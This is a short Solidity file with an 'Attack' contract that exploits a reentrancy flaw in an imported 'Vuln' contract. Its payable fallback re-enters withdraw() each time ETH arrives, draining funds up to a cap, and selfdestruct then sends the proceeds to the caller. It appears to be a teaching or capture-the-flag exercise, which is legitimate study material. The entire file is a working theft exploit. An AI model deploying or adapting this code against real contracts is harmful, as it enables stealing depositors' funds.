pragma solidity ^0.5.0;

import './vuln.sol';

contract Attack {
    Vuln public vuln;

    /* use address provided in contract creation as vulnerable contract */
    constructor (address _vuln) public {
        vuln = Vuln(_vuln);
    }

    /* steal deposits initial value then immediately withdraws, which
       results in recursive fallback function calls */
    function steal() public payable {
        vuln.deposit.value(msg.value)();
        vuln.withdraw();
    } 

    /* end destroys contract and sends collected ETH to caller address */
    function end() public{
        selfdestruct(msg.sender);
    }

    /* fallback function is called when receiving withdrawn eth */
    function () external payable {
        // limit amount stolen so everyone gets a chance.
        if (address(this).balance <= 0.1 ether) {
            vuln.withdraw();
        }
    }
}